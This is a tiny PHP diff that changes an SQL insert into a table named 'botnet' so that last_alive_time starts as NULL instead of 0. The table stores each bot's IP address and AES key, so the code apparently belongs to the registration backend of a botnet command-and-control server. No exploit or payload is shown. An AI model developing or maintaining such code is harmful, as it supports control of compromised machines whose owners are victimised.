@@ -33,7 +33,7 @@ $ip_bin = inet_pton($ip);
 // 3. 重置 last_alive_time
 $sql = "
     INSERT INTO botnet (ip, aes_key, last_alive_time, is_deleted)
-    VALUES (?, UNHEX(?), 0, 0)
+    VALUES (?, UNHEX(?),  NULL, 0)
     ON DUPLICATE KEY UPDATE
     aes_key = UNHEX(?),
     is_deleted = 0,
